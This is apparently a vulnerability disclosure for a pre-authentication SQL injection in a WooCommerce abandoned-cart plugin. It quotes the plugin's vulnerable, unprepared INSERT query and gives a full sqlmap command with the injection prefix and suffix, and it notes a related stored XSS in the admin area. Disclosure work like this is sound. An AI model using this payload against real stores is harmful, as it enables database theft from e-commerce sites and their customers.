# WooCommerce abandoned cart before 5.8.2 SQL injection

Abandoned Cart Plugin  stands for recovering abandoned shopping carts for WooCommerce. Plugin source code is in quite bad shape from the good WP plugin development practices, but it got quite good coverage from some Woo "authorities" in the past and it is installed on 30k+ active stores. Here we talk about preauth SQL injection that beside its consequences results in stored XSS directly in the WP admin area. Quite severe vulnerability when we speak about e-commerce.

## Eli5 PoC

Vulnerability exists in `woocommerce_guest_ac` class, where on WP initialization and class constructor
```
add_action( 'init', 'load_ac_ajax' );
```
it is added not privileged ajax action
```
function load_ac_ajax() {
		if ( ! is_user_logged_in() ) {
			add_action( 'wp_ajax_nopriv_save_data', 'save_data' );
		}
	}
```
in `save_data` we have the following "protections"
```
if ( isset( $_POST['billing_first_name'] ) && '' !== $_POST['billing_first_name'] ) {
				wcal_common::wcal_set_cart_session( 'billing_first_name', sanitize_text_field( wp_unslash( $_POST['billing_first_name'] ) ) );
			}
...
// Insert record in guest table
			$billing_first_name = wcal_common::wcal_get_cart_session( 'billing_first_name' );
```
and later this is the input towards not prepared DB query
```
$insert_guest     = 'INSERT INTO `' . $wpdb->prefix . "ac_guest_abandoned_cart_history_lite`( billing_first_name, billing_last_name, email_id, billing_zipcode, shipping_zipcode, shipping_charges ) 
                            VALUES ( '" . $billing_first_name . "', '" . $billing_last_name . "', '" . wcal_common::wcal_get_cart_session( 'billing_email' ) . "', '" . $billing_zipcode . "', '" . $shipping_zipcode . "', '" . $shipping_charges . "' )";
			$wpdb->query( $insert_guest );
```

So achieving the preauth SQLi is quite trivial e.g. on checkout page when `save_data` ajax action is called. In order to verify this vulnerability on your local setup, you will need a WP/Woo cookies and plugin nonce `wcal_guest_capture_nonce`. So we have the following:
```
python3 sqlmap.py -u http://local.target/wp-admin/admin-ajax.php --cookie='[cookies content here]' --method='POST' --data='billing_first_name=wpdeeply&billing_last_name=wpdeeply&billing_company=wpdeeply&billing_address_1=wpdeeply&billing_address_2=wpdeeply&billing_city=wpdeeply&billing_state=wpdeeply&billing_postcode=123234&billing_country=GB&billing_phone=12324&billing_email=wpdeeply%40protonmail.com&order_notes=&wcal_guest_capture_nonce=[nonce-value]&action=save_data' -p billing_first_name --prefix="', '', '','', '',( TRUE " --suffix=")) -- wpdeeply" --dbms mysql --technique=T --time-sec=1 --current-db --current-user
```
If you dive deeper into plugin code, you will notice that this content is displayed in admin area, so there is nice stored XSS too, almost the same technique like here.

## Few facts

- As Woo owner you should trust no one regarding plugins / software on your e-commerce infrastructure.
- Plugin developer was brave enough to ask for fix to be deployed in end of November while 100-200 new active installs per day happened and plugins team were "polite" enough to allow that
- This bug seems like classical backdoor, but I'll judge in a favor of not following best WP development practices
- Woo vulnerabilities != WP vulnerabilities

## Remediation

- Use best deployment practices for web / PHP applications
- Test and regression verify code that lands on your e-commerce 

